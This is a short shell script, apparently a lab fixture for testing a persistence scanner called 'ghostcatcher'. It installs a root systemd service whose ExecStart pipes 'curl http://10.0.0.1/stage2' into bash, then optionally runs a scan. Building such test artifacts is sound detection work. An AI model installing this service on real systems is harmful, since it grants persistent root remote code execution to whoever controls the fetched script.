#!/bin/sh
# SYSTEMD_PERSISTENCE
# Doğrudan: sudo sh ./systemd.sh
# Tarama:    GCLAB_RUN_SCAN=1 sudo sh ./systemd.sh   veya   sudo sh ./systemd.sh scan
. "$(cd "$(dirname "$0")" && pwd)/lib-env.sh"
set -e
cat > /etc/systemd/system/lab-ghostcatcher-inject.service <<'EOF'
[Unit]
Description=Lab inject (curl + root)
[Service]
Type=oneshot
User=root
ExecStart=/usr/bin/curl -s http://10.0.0.1/stage2 | bash
RemainAfterExit=yes
[Install]
WantedBy=multi-user.target
EOF
chmod 644 /etc/systemd/system/lab-ghostcatcher-inject.service

gclab_scan_if_requested "$@"
